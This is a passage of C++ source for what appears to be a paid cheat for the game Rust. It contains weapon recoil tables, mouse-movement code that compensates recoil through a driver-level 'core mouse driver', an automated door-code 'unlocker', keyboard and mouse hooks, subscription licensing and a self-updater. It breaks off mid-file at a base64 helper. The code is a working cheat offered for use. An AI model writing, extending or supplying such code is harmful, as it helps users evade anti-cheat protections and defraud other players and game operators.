const std::vector<double> LR300_OFFSET_X = {0.0, 0.016310668448276, 0.016310668448276, 0.016310668448276, 0.01010668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014100668448276, 0.014400668448276, 0.014300668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.014310668448276, 0.015310668448276, 0.017310668448276, 0.017310668448276, 0.017310668448276, 0.017410668448276, 0.017310668448276, 0.017310668448276, 0.017310668448276};
const std::vector<double> LR300_OFFSET_Y = {-1.25, -1.253, -1.255, -1.257, -1.257, -1.257, -1.257, -1.256, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255, -1.255};
const double LR300_RPM_DELAY = 120.0; 
const int LR300_BULLETS = LR300_OFFSET_Y.size();

const std::vector<double> THOMPSON_OFFSET_X = {-0.085809965, 0.006514516, 0.007734019, 0.048618872, 0.078056445, -0.066088665, 0.067429669, 0.02780332, 0.133849085, 0.025890565, -0.061893655, 0.019062548, 0.061710655, -0.091478981, 0.021023053, -0.08700972, -0.200583254, -0.0398146, 0.003178508};
const std::vector<double> THOMPSON_OFFSET_Y = {-0.510477526, -0.509449769, -0.51512903, -0.519510046, -0.494714729, -0.498322988, -0.509388516, -0.479468436, -0.48205394, -0.509083505, -0.502620747, -0.485474444, -0.493339713, -0.502579241, -0.502866742, -0.52610755, -0.50284349, -0.51412102, -0.487279713};
const double THOMPSON_RPM_DELAY = 129.87013; 
const int THOMPSON_BULLETS = THOMPSON_OFFSET_Y.size();

const std::vector<double> SAR_OFFSET_X = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0};
const std::vector<double> SAR_OFFSET_Y = {-0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775, -0.8775};
const double SAR_RPM_DELAY = 174.927114; 
const int SAR_BULLETS = SAR_OFFSET_Y.size();

const std::vector<double> MP5A4_OFFSET_X = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0};
const std::vector<double> MP5A4_OFFSET_Y = {-0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64, -0.64};
const double MP5A4_RPM_DELAY = 100.0;
const int MP5A4_BULLETS = MP5A4_OFFSET_Y.size();

const std::vector<double> HMLMG_OFFSET_X = {0.0, -0.506458333, -0.506458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.516458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -0.526458333, -1.5226458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333, -1.526458333};
const std::vector<double> HMLMG_OFFSET_Y = {-1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.347375, -1.37375, -1.347375, -1.347375, -1.347375, -1.347375, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333, -1.656458333};
const double HMLMG_RPM_DELAY = 125.0; // 60000 / 125 RPM = 480 ms
const int HMLMG_BULLETS = HMLMG_OFFSET_Y.size();

const std::vector<double> M249_OFFSET_X = {0.0, 0.39375, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525, 0.525};
const std::vector<double> M249_OFFSET_Y = {-0.89, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.00, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.10, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100, -1.100};
const double M249_RPM_DELAY = 120.0;
const int M249_BULLETS = M249_OFFSET_Y.size();


// --- Recoil Profile Data Structure ---
struct RecoilProfileData {
    std::vector<int> comp_x; // Calculated compensation pixels X
    std::vector<int> comp_y; // Calculated compensation pixels Y
    std::vector<double> action_time; // Time spent moving mouse for each bullet
    std::vector<double> sleep_time;  // Time spent sleeping after moving for each bullet
    int bullets = 0;
    bool is_sar = false;
    bool is_muzzle_boost = false; // Needed for stance logic
    bool is_muzzle_brake = false;
};

// --- Shared State Variables ---
std::atomic<bool> profile_macro_active{true}; // Renamed from kickback_active
std::atomic<bool> ui_toggle_key_pressed{false}; // نگهداری وضعیت فشرده شدن کلید UI toggle
std::string current_gun_profile_str = PROFILE_AK47;        // Name of the currently selected profile
std::mutex profile_mutex;                        // Protects current_gun_profile_str AND calculated_profiles AND g_profile_keybinds
std::atomic<bool> left_mouse_down{false};        // State of left  button
std::atomic<bool> right_mouse_down{false};       // State of right  button
std::atomic<bool> stop_recoil_flag{false};       // Signal to stop current recoil spray
std::atomic<bool> g_recoil_thread_should_run{true}; // Controls lifetime of recoil thread
std::atomic<bool> show_config_window_atomic{true};

// Enum to manage the current view in the ImGui window
enum class ViewState {
    Login,   // Added Login view state
    Home,
    Keybinds,
    DoorUnlocker, // Added Door Unlocker view state
    SoundSettings, // Added Sound Settings view state
    Subscription, // Renamed Support to Subscription
    AboutMe,  // Added About Me view state
    Settings  // Added Settings view state
};

// Variable to track the current view state
ViewState current_view = ViewState::Login; // Default view is Login

// --- Licensing Variables ---
std::atomic<bool> is_licensed{false};
char license_key_input[256] = "";
std::chrono::system_clock::time_point g_activation_time;
long long g_subscription_duration_seconds = 0;
std::string g_start_license_str = "N/A"; // <--- متغیر جدید برای ذخیره تاریخ شروع لایسنس
std::mutex g_license_data_mutex;

std::string g_plan_type = "unknown";

// --- Usage Tracking Variables ---
// مجموع زمان استفاده از برنامه (بر حسب ثانیه) که در config ذخیره می‌شود
long long g_total_usage_seconds = 0;
// زمان شروع اولین سشن بعد از لاگین موفق (برای محاسبه مدت سشن فعلی)
std::chrono::steady_clock::time_point g_session_start_time;

// --- Remember Me Variables ---
bool g_remember_me = false; // State of the Remember Me checkbox
std::string g_saved_license_key = ""; // To store the license key if Remember Me is checked
int g_license_used_count = -1; // To store the 'used_count' from the license API, -1 indicates not loaded

// --- Update State Variables ---
std::atomic<bool> g_update_required{false};
std::atomic<bool> g_update_download_in_progress{false};
std::atomic<bool> g_update_download_done{false};
std::atomic<bool> g_update_download_failed{false};
std::string g_update_download_url;
std::string g_update_download_error;
std::string g_update_download_path;
std::string g_update_new_version; // filled from server if provided
std::mutex g_update_mutex;

// Download progress (bytes)
std::atomic<long long> g_update_bytes_downloaded{0};
std::atomic<long long> g_update_bytes_total{0};

// Flag to request automatic application exit after a successful update
std::atomic<bool> g_exit_after_update{false};

// Map key to total duration in seconds (Moved inside the check function for simulation)
// const std::map<std::string, long long> VALID_LICENSE_KEYS = { ... };

// --- Variables for Async Login ---
std::atomic<bool> g_is_logging_in{false}; // Flag to indicate if login is in progress
std::string login_error_message = ""; // Message to display on login failure
std::mutex g_login_error_mutex; // Mutex to protect login_error_message


std::map<std::string, RecoilProfileData> calculated_profiles; // Stores calculated data for each profile

// Buffer for Door Unlocker code input (Moved to global scope)
static char door_code_buffer[10]; // Max 4 digits + null terminator + some buffer

// Map to track processed key down events for toggles
static std::map<int, bool> toggle_key_states;

// متغیرهای بازخورد برای نمایش پیام‌های موقت
std::string g_feedback_message = "";
std::chrono::steady_clock::time_point g_feedback_message_end_time;

std::atomic<bool> g_ui_notice_active(false);
UINoticeLevel g_ui_notice_level = UINoticeLevel::Info;
std::string g_ui_notice_title;
std::string g_ui_notice_message;
std::string g_ui_notice_details;
std::mutex g_ui_notice_mutex;

// تابع برای نمایش پیام بازخورد به کاربر
void show_feedback_message(const std::string& message) {
    g_feedback_message = message;
    g_feedback_message_end_time = std::chrono::steady_clock::now() + std::chrono::seconds(3); // نمایش برای 3 ثانیه
}

void set_ui_notice(UINoticeLevel level,
                   const std::string& title,
                   const std::string& message,
                   const std::string& details) {
    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
    g_ui_notice_level = level;
    g_ui_notice_title = title;
    g_ui_notice_message = message;
    g_ui_notice_details = details;
    g_ui_notice_active.store(true, std::memory_order_relaxed);
}

void clear_ui_notice() {
    std::lock_guard<std::mutex> lock(g_ui_notice_mutex);
    g_ui_notice_title.clear();
    g_ui_notice_message.clear();
    g_ui_notice_details.clear();
    g_ui_notice_active.store(false, std::memory_order_relaxed);
}

// --- Sound Settings ---
std::atomic<bool> g_sound_enabled{true}; // Default to sound enabled
// متغیر برای ذخیره خودکار تنظیمات
bool AUTO_SAVE_ENABLED = true; // به طور پیش‌فرض ذخیره خودکار فعال است

// --- Auto Crouch Scope Setting ---
std::atomic<bool> g_auto_crouch_scope_enabled{false}; // Default to disabled
// Removed EXIT_SOUND_FILE constant
// const std::string EXIT_SOUND_FILE = "C:\\Windows\\Media\\Windows Exit.wav";
// Removed Macro Toggle sound file constants
// const std::string MACRO_TOGGLE_ON_SOUND_FILE = "C:\\Windows\\Media\\Windows Logon.wav";
// const std::string MACRO_TOGGLE_OFF_SOUND_FILE = "C:\\Windows\\Media\\Windows Logoff Sound.wav";
const std::string LOGIN_SUCCESS_SOUND_FILE = "C:\\Windows\\Media\\Windows Ding.wav";
const std::string LOGIN_FAILURE_SOUND_FILE = "C:\\Windows\\Media\\Windows Error.wav"; // Will be used for exit sound

// --- Hooks ---
HHOOK keyboard_hook = NULL;
HHOOK mouse_hook = NULL;


// --- Constants ---
const double StandMultiplier = 1.89; // Example Multiplier when standing

// --- Helper Functions for DX11 Setup ---
bool CreateDeviceD3D(HWND hWnd);
void CleanupDeviceD3D();
void CreateRenderTarget();
void CleanupRenderTarget();

// --- Time Helper Functions ---
// Convert time_point to Unix timestamp (seconds since epoch)
long long time_point_to_timestamp(const std::chrono::system_clock::time_point& tp) {
    return std::chrono::duration_cast<std::chrono::seconds>(tp.time_since_epoch()).count();
}

// Convert Unix timestamp (seconds since epoch) to time_point
std::chrono::system_clock::time_point timestamp_to_time_point(long long timestamp) {
    // Corrected: Use std::chrono::system_clock::time_point
    return std::chrono::system_clock::time_point(std::chrono::seconds(timestamp));
}

// Format time_point into a readable string (YYYY-MM-DD HH:MM:SS)
std::string format_time_point(const std::chrono::system_clock::time_point& tp) {
    std::time_t tt = std::chrono::system_clock::to_time_t(tp);
    std::tm tm;
    // Use thread-safe version if available (e.g., gmtime_s, localtime_s)
#ifdef _MSC_VER
    localtime_s(&tm, &tt);
#else
    tm = *std::localtime(&tt); // Not thread-safe
#endif
    std::stringstream ss;
    ss << std::put_time(&tm, "%Y-%m-%d %H:%M:%S");
    return ss.str();
}

// Format duration in seconds into a human-readable string (e.g., "1 month", "3 days", "45 minutes")
std::string format_duration_seconds(long long total_seconds) {
    if (total_seconds <= 0) return "N/A";

    long long days = total_seconds / (24 * 3600);
    long long hours = (total_seconds % (24 * 3600)) / 3600;
    long long minutes = (total_seconds % 3600) / 60;
    long long seconds = total_seconds % 60;

    if (days >= 30) { // Approximate months
        long long months = days / 30;
        return std::to_string(months) + " months";
    } else if (days > 0) {
        return std::to_string(days) + " days";
    } else if (hours > 0) {
        return std::to_string(hours) + " hours";
    } else if (minutes > 0) {
        return std::to_string(minutes) + " minutes";
    } else {
        return std::to_string(seconds) + " seconds";
    }
}

// Calculate remaining duration string (e.g., "Expires in 3 days", "Expired 5 hours ago")
std::string calculate_remaining_duration_string(const std::chrono::system_clock::time_point& activation_time, long long total_duration_seconds) {
    if (total_duration_seconds <= 0) {
        return "N/A"; // No subscription duration set
    }

    auto now = std::chrono::system_clock::now();
    auto expiration_time = activation_time + std::chrono::seconds(total_duration_seconds);

    if (now >= expiration_time) {
        // Calculate time past expiration
        auto elapsed_after_expiry = now - expiration_time;
        auto total_seconds_past = std::chrono::duration_cast<std::chrono::seconds>(elapsed_after_expiry).count();

        if (total_seconds_past < 60) return "Expired " + std::to_string(total_seconds_past) + " seconds ago";
        if (total_seconds_past < 3600) return "Expired " + std::to_string(total_seconds_past / 60) + " minutes ago";
        if (total_seconds_past < 86400) return "Expired " + std::to_string(total_seconds_past / 3600) + " hours ago";
        return "Expired " + std::to_string(total_seconds_past / 86400) + " days ago";

    } else {
        // Calculate remaining time
        auto remaining_duration = expiration_time - now;
        auto total_seconds_remaining = std::chrono::duration_cast<std::chrono::seconds>(remaining_duration).count();

        if (total_seconds_remaining < 60) return "Expires in " + std::to_string(total_seconds_remaining) + " seconds";
        if (total_seconds_remaining < 3600) return "Expires in " + std::to_string(total_seconds_remaining / 60) + " minutes";
        if (total_seconds_remaining < 86400) return "Expires in " + std::to_string(total_seconds_remaining / 3600) + " hours";
        return "Expires in " + std::to_string(total_seconds_remaining / 86400) + " days";
    }
}

// --- Helper Functions ---
// Rounding function (using original code's logic)
int custom_round(double x) {
    return (x >= 0.0) ? static_cast<int>(std::floor(x + 0.5)) : static_cast<int>(std::ceil(x - 0.5));
}

// Precise sleep function
void sleep_ms(int ms) {
    if (ms > 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(ms));
    }
}

void move_mouse_relative_core(int dx, int dy) {
    if (dx == 0 && dy == 0) return;

    std::call_once(g_core_mouse_init_flag, []() {
        g_coreMouseDriver.Open();
    });

    if (g_coreMouseDriver.IsOpen()) {
        g_coreMouseDriver.MoveMouse(dx, dy);
    }
}

// Check key state (using GetAsyncKeyState)
bool is_key_down(int vk_code) {
    return (GetAsyncKeyState(vk_code) & 0x8000) != 0;
}

// Smoothed mouse movement (example implementation)
void smoothing(double duration_ms, int target_dx, int target_dy) {
    int steps = std::max(1, static_cast<int>(duration_ms / 10.0)); // Move roughly every 10ms
    if (steps <= 0) { // Handle very short durations or zero movement
        if (target_dx != 0 || target_dy != 0) {
            move_mouse_relative_core(target_dx, target_dy);
        }
        if (duration_ms > 0) {
             sleep_ms(static_cast<int>(duration_ms));
        }
        return;
    }

    double dx_per_step = static_cast<double>(target_dx) / steps;
    double dy_per_step = static_cast<double>(target_dy) / steps;
    double moved_x = 0.0;
    double moved_y = 0.0;
    auto start_time = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < steps; ++i) {
        if (stop_recoil_flag.load(std::memory_order_relaxed)) return; // Check stop flag frequently

        double current_target_x_exact = (i + 1) * dx_per_step;
        double current_target_y_exact = (i + 1) * dy_per_step;
        int move_x = custom_round(current_target_x_exact - moved_x);
        int move_y = custom_round(current_target_y_exact - moved_y);

        if (move_x != 0 || move_y != 0) {
            move_mouse_relative_core(move_x, move_y);
            moved_x += move_x;
            moved_y += move_y;
        }

        auto now = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double, std::milli> elapsed = now - start_time;
        double expected_time_ms = (i + 1) * (duration_ms / steps);
        double sleep_duration_ms = std::max(0.0, expected_time_ms - elapsed.count());

        if (sleep_duration_ms > 0) {
             // Use precise sleep if available, otherwise sleep_ms
             std::this_thread::sleep_for(std::chrono::duration<double, std::milli>(sleep_duration_ms));
        }
    }

    // Ensure any remaining fractional movement is applied at the very end
    int final_dx = target_dx - custom_round(moved_x);
    int final_dy = target_dy - custom_round(moved_y);
    if (final_dx != 0 || final_dy != 0) {
        move_mouse_relative_core(final_dx, final_dy);
    }
}
// Simulate key press/release (needed for SAR and Door Unlocker)
void press_key_vk(int vk_code) {
    INPUT input{}; // Use value initialization to zero out all members
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = vk_code;
    // The rest of input.ki members are zero-initialized by {}
    SendInput(1, &input, sizeof(input));
}

void release_key_vk(int vk_code) {
    INPUT input{}; // Use value initialization to zero out all members
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = vk_code;
    input.ki.dwFlags = KEYEVENTF_KEYUP; // Set the key up flag
    // The rest of input.ki members are zero-initialized by {}
    SendInput(1, &input, sizeof(input));
}


// Logging function (could be enhanced to log to ImGui window)
void output_log_message(const std::string& message) {
    // For now, just output to console.
    std::cout << message << std::flush;
    // TODO: Optionally append to an ImGui text buffer
}

// Helper function to play a sound asynchronously
void play_sound_async(const std::string& file_path) {
    if (g_sound_enabled.load(std::memory_order_relaxed) && !file_path.empty()) {
        // PlaySound requires a valid window handle or NULL for system sounds.
        // Using SND_FILENAME for a specific WAV file.
        // SND_ASYNC plays the sound asynchronously so it doesn't block.
        // SND_NODEFAULT prevents the default beep if the file isn't found.
        // SND_PURGE stops any currently playing sound before playing the new one.
        BOOL success = PlaySound(file_path.c_str(), NULL, SND_FILENAME | SND_ASYNC | SND_NODEFAULT | SND_PURGE);
        if (!success) {
            // Log an error if PlaySound failed
            DWORD error = GetLastError();
            output_log_message("Warning: PlaySound failed for file '" + file_path + "'. Error code: " + std::to_string(error) + "\n");
        } else {
             output_log_message("Playing sound: " + file_path + "\n");
        }
    }
}

// --- VK Code to String Mapping ---
void initialize_vk_code_names() {
    vk_code_names[VK_LBUTTON] = "LBUTTON"; vk_name_codes["LBUTTON"] = VK_LBUTTON;
    vk_code_names[VK_RBUTTON] = "RBUTTON"; vk_name_codes["RBUTTON"] = VK_RBUTTON;
    vk_code_names[VK_CANCEL] = "CANCEL"; vk_name_codes["CANCEL"] = VK_CANCEL;
    vk_code_names[VK_MBUTTON] = "MBUTTON"; vk_name_codes["MBUTTON"] = VK_MBUTTON;
    vk_code_names[VK_XBUTTON1] = "XBUTTON1"; vk_name_codes["XBUTTON1"] = VK_XBUTTON1;
    vk_code_names[VK_XBUTTON2] = "XBUTTON2"; vk_name_codes["XBUTTON2"] = VK_XBUTTON2;
    vk_code_names[VK_BACK] = "BACKSPACE"; vk_name_codes["BACKSPACE"] = VK_BACK;
    vk_code_names[VK_TAB] = "TAB"; vk_name_codes["TAB"] = VK_TAB;
    vk_code_names[VK_CLEAR] = "CLEAR"; vk_name_codes["CLEAR"] = VK_CLEAR;
    vk_code_names[VK_RETURN] = "RETURN"; vk_name_codes["RETURN"] = VK_RETURN;
    vk_code_names[VK_SHIFT] = "SHIFT"; vk_name_codes["SHIFT"] = VK_SHIFT;
    vk_code_names[VK_CONTROL] = "CTRL"; vk_name_codes["CTRL"] = VK_CONTROL;
    vk_code_names[VK_MENU] = "ALT"; vk_name_codes["ALT"] = VK_MENU;
    vk_code_names[VK_PAUSE] = "PAUSE"; vk_name_codes["PAUSE"] = VK_PAUSE;
    vk_code_names[VK_CAPITAL] = "CAPS LOCK"; vk_name_codes["CAPS LOCK"] = VK_CAPITAL;
    vk_code_names[VK_KANA] = "KANA"; vk_name_codes["KANA"] = VK_KANA;
    vk_code_names[VK_JUNJA] = "JUNJA"; vk_name_codes["JUNJA"] = VK_JUNJA;
    vk_code_names[VK_FINAL] = "FINAL"; vk_name_codes["FINAL"] = VK_FINAL;
    vk_code_names[VK_KANJI] = "KANJI"; vk_name_codes["KANJI"] = VK_KANJI;
    vk_code_names[VK_ESCAPE] = "ESCAPE"; vk_name_codes["ESCAPE"] = VK_ESCAPE;
    vk_code_names[VK_CONVERT] = "CONVERT"; vk_name_codes["CONVERT"] = VK_CONVERT;
    vk_code_names[VK_NONCONVERT] = "NONCONVERT"; vk_name_codes["NONCONVERT"] = VK_NONCONVERT;
    vk_code_names[VK_ACCEPT] = "ACCEPT"; vk_name_codes["ACCEPT"] = VK_ACCEPT;
    vk_code_names[VK_MODECHANGE] = "MODECHANGE"; vk_name_codes["MODECHANGE"] = VK_MODECHANGE;
    vk_code_names[VK_SPACE] = "SPACE"; vk_name_codes["SPACE"] = VK_SPACE;
    vk_code_names[VK_PRIOR] = "PGUP"; vk_name_codes["PGUP"] = VK_PRIOR;
    vk_code_names[VK_NEXT] = "PGDN"; vk_name_codes["PGDN"] = VK_NEXT;
    vk_code_names[VK_END] = "END"; vk_name_codes["END"] = VK_END;
    vk_code_names[VK_HOME] = "HOME"; vk_name_codes["HOME"] = VK_HOME;
    vk_code_names[VK_LEFT] = "LEFT ARROW"; vk_name_codes["LEFT ARROW"] = VK_LEFT;
    vk_code_names[VK_UP] = "UP ARROW"; vk_name_codes["UP ARROW"] = VK_UP;
    vk_code_names[VK_RIGHT] = "RIGHT ARROW"; vk_name_codes["RIGHT ARROW"] = VK_RIGHT;
    vk_code_names[VK_DOWN] = "DOWN ARROW"; vk_name_codes["DOWN ARROW"] = VK_DOWN;
    vk_code_names[VK_SELECT] = "SELECT"; vk_name_codes["SELECT"] = VK_SELECT;
    vk_code_names[VK_PRINT] = "PRINT"; vk_name_codes["PRINT"] = VK_PRINT;
    vk_code_names[VK_EXECUTE] = "EXECUTE"; vk_name_codes["EXECUTE"] = VK_EXECUTE;
    vk_code_names[VK_SNAPSHOT] = "PRT SC"; vk_name_codes["PRT SC"] = VK_SNAPSHOT;
    vk_code_names[VK_INSERT] = "INSERT"; vk_name_codes["INSERT"] = VK_INSERT;
    vk_code_names[VK_DELETE] = "DELETE"; vk_name_codes["DELETE"] = VK_DELETE;
    vk_code_names[VK_HELP] = "HELP"; vk_name_codes["HELP"] = VK_HELP;

    // Number keys 0-9
    for (int i = 0; i <= 9; ++i) {
        vk_code_names['0' + i] = std::string(1, (char)('0' + i));
        vk_name_codes[std::string(1, (char)('0' + i))] = '0' + i;
    }
    // Letter keys A-Z
    for (int i = 0; i < 26; ++i) {
        vk_code_names['A' + i] = std::string(1, (char)('A' + i));
        vk_name_codes[std::string(1, (char)('A' + i))] = 'A' + i;
    }

    vk_code_names[VK_LWIN] = "LWIN"; vk_name_codes["LWIN"] = VK_LWIN;
    vk_code_names[VK_RWIN] = "RWIN"; vk_name_codes["RWIN"] = VK_RWIN;
    vk_code_names[VK_APPS] = "APPS"; vk_name_codes["APPS"] = VK_APPS;
    vk_code_names[VK_SLEEP] = "SLEEP"; vk_name_codes["SLEEP"] = VK_SLEEP;

    // Numpad keys
    for (int i = 0; i <= 9; ++i) {
        vk_code_names[VK_NUMPAD0 + i] = "NUM " + std::to_string(i);
        vk_name_codes["NUM " + std::to_string(i)] = VK_NUMPAD0 + i;
    }
    vk_code_names[VK_MULTIPLY] = "NUM *"; vk_name_codes["NUM *"] = VK_MULTIPLY;
    vk_code_names[VK_ADD] = "NUM +"; vk_name_codes["NUM +"] = VK_ADD;
    vk_code_names[VK_SEPARATOR] = "NUM SEP"; vk_name_codes["NUM SEP"] = VK_SEPARATOR;
    vk_code_names[VK_SUBTRACT] = "NUM -"; vk_name_codes["NUM -"] = VK_SUBTRACT;
    vk_code_names[VK_DECIMAL] = "NUM ."; vk_name_codes["NUM ."] = VK_DECIMAL;
    vk_code_names[VK_DIVIDE] = "NUM /"; vk_name_codes["NUM /"] = VK_DIVIDE;

    // Function keys F1-F24
    for (int i = 1; i <= 24; ++i) {
        vk_code_names[VK_F1 + i - 1] = "F" + std::to_string(i);
        vk_name_codes["F" + std::to_string(i)] = VK_F1 + i - 1;
    }

    vk_code_names[VK_NUMLOCK] = "NUM LOCK"; vk_name_codes["NUM LOCK"] = VK_NUMLOCK;
    vk_code_names[VK_SCROLL] = "SCROLL LOCK"; vk_name_codes["SCROLL LOCK"] = VK_SCROLL;
    vk_code_names[VK_LSHIFT] = "LSHIFT"; vk_name_codes["LSHIFT"] = VK_LSHIFT;
    vk_code_names[VK_RSHIFT] = "RSHIFT"; vk_name_codes["RSHIFT"] = VK_RSHIFT;
    vk_code_names[VK_LCONTROL] = "LCTRL"; vk_name_codes["LCTRL"] = VK_LCONTROL;
    vk_code_names[VK_RCONTROL] = "RCTRL"; vk_name_codes["RCTRL"] = VK_RCONTROL;
    vk_code_names[VK_LMENU] = "LALT"; vk_name_codes["LALT"] = VK_LMENU;
    vk_code_names[VK_RMENU] = "RALT"; vk_name_codes["RALT"] = VK_RMENU;

    // Add VK_OEM_8 for 'ظ' key (or other regional keys)
    vk_code_names[VK_OEM_8] = "OEM_8 ('ظ')"; vk_name_codes["OEM_8 ('ظ')"] = VK_OEM_8;


    // Add more keys as needed...
}

std::string vk_code_to_string(int vk_code) {
    if (vk_code_names.count(vk_code)) {
        return vk_code_names.at(vk_code);
    }
    return "VK_" + std::to_string(vk_code); // Fallback to VK code number
}

int vk_string_to_code(const std::string& vk_name) {
    if (vk_name_codes.count(vk_name)) {
        return vk_name_codes.at(vk_name);
    }
    // Attempt to parse as VK_number
    if (vk_name.rfind("VK_", 0) == 0) { // Starts with VK_
        try {
            return std::stoi(vk_name.substr(3));
        } catch (...) {
            // Ignore parsing errors
        }
    }
    return 0; // Return 0 or some invalid code on failure
}

// --- Function to reset keybinds to default ---
void reset_keybinds_to_defaults() {
    std::lock_guard<std::mutex> lock(profile_mutex); // Protect g_profile_keybinds
    g_profile_keybinds = {
        {PROFILE_AK47, VK_F4},
        {PROFILE_LR300, VK_F5},
        {PROFILE_THOMPSON, VK_F6},
        {PROFILE_MP5A4, VK_F7},
        {PROFILE_SAR, VK_F8},
        {PROFILE_HMLMG, VK_F9},
        {PROFILE_M249, VK_F10}
    };
    g_ui_toggle_key.store(VK_HOME);
    g_exit_app_key.store(VK_INSERT);
    g_lmb_key.store(VK_LBUTTON); // Reset LMB to default
    g_rmb_key.store(VK_RBUTTON); // Reset RMB to default
    g_nightModeKey.store(VK_END); // Reset Night Mode Key to default
    g_door_unlock_trigger_key = VK_XBUTTON2; // Reset Door Unlock Trigger to default
    // Reset Auto Crouch Scope feature to default (disabled)
    g_auto_crouch_scope_enabled.store(false);
    output_log_message("Keybinds reset to defaults.\n");
}

// --- Encryption/Decryption Helpers for Remember Me ---

// IMPORTANT: CHANGE THIS KEY TO A UNIQUE, RANDOM, AND SECRET STRING FOR YOUR APPLICATION!
// This key is used for simple XOR encryption and provides only a basic level of obfuscation.
// It will NOT protect the license key from determined attackers.
const std::string XOR_KEY = xor_strings::get_license_storage_key();
// Using the inline xor_encrypt_decrypt function defined at the top of the file

// Base64 encoding table
const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

// Helper function to check if a character is a valid Base64 character
static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

// Base64 encode function
std::string base64_encode(const std::string& in) {
    std::string out;

    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_chars[(val >> valb) & 0x3f]);
            valb -= 6;
        }
    }
    if (valb > -6) {
        out.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3f]);
    }
    while (out.size() % 4) {
        out.push_back('=');
    }

    return out;
}

// Base64 decode function
